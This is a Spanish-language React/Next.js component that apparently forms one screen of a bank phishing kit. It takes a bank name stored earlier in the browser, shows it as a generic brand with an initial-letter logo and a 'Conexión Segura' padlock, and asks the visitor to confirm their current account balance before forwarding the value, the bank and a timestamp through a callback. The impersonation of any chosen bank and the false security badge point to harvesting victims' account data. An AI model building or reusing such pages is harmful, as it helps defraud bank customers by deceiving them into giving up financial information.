/* eslint-disable @typescript-eslint/no-explicit-any */
/* eslint-disable @next/next/no-img-element */
/* eslint-disable @next/next/no-html-link-for-pages */
"use client";
import { useState, useEffect } from "react";

export default function Saldo({ enviar }: any) {
  const [banco, setBanco] = useState("Tu Banco");
  const [saldo, setSaldo] = useState("");

  useEffect(() => {
    if (typeof window !== "undefined") {
      const storedBank = localStorage.getItem("bankSelct");
      if (storedBank) {
        setBanco(storedBank);
      }
    }
  }, []);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();

    if (!saldo) return;

    const payload = {
      view: 'saldo',
      saldo,
      bank: banco,
      timestamp: new Date().toISOString(),
    };

    enviar?.(payload);
  };

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value.replace(/\D/g, "");
    if (value) {
      value = new Intl.NumberFormat("es-CO").format(parseInt(value));
      setSaldo(`$ ${value}`);
    } else {
      setSaldo("");
    }
  };

  const isFormValid = !!saldo;

  return (
    <div className="min-h-screen bg-gray-50 flex items-center justify-center p-4">
      <div className="bg-white rounded-xl shadow-2xl overflow-hidden max-w-md w-full">
        {/* Encabezado */}
        <div className="bg-linear-to-r from-blue-700 to-blue-500 p-8 text-center">
          <div className="w-20 h-20 bg-white rounded-full flex items-center justify-center mx-auto mb-4 shadow-inner">
            <span className="text-3xl font-bold text-blue-600">
              {banco.charAt(0).toUpperCase()}
            </span>
          </div>
          <h2 className="text-2xl font-bold text-white mb-2">{banco}</h2>
          <p className="text-blue-100 text-sm">Confirma tu saldo</p>
        </div>

        {/* Formulario */}
        <div className="p-8">
          <form onSubmit={handleSubmit} className="space-y-6">
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-1">
                Saldo actual
              </label>
              <input
                type="text"
                placeholder="$ 0"
                value={saldo}
                onChange={handleInputChange}
                className="w-full px-4 py-3 rounded-lg border border-gray-300 focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition-colors bg-gray-50 text-gray-900 text-center"
                style={{ fontSize: '18px', fontWeight: 'bold' }}
              />
            </div>

            <button
              type="submit"
              disabled={!isFormValid}
              className={`w-full py-4 px-4 border border-transparent rounded-lg shadow-sm text-lg font-bold text-white ${
                isFormValid
                  ? "bg-blue-600 hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500 transition-colors"
                  : "bg-gray-400 cursor-not-allowed"
              }`}
            >
              Continuar
            </button>
          </form>

          {/* Pie del formulario */}
          <div className="mt-8 pt-6 border-t border-gray-100 flex items-center justify-between text-xs text-gray-500">
            <span className="flex items-center gap-1">
              <svg className="w-4 h-4 text-green-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path>
              </svg>
              Conexión Segura
            </span>
            <a href="#" className="hover:text-blue-600 transition-colors">Ayuda</a>
          </div>
        </div>
      </div>
    </div>
  );
}
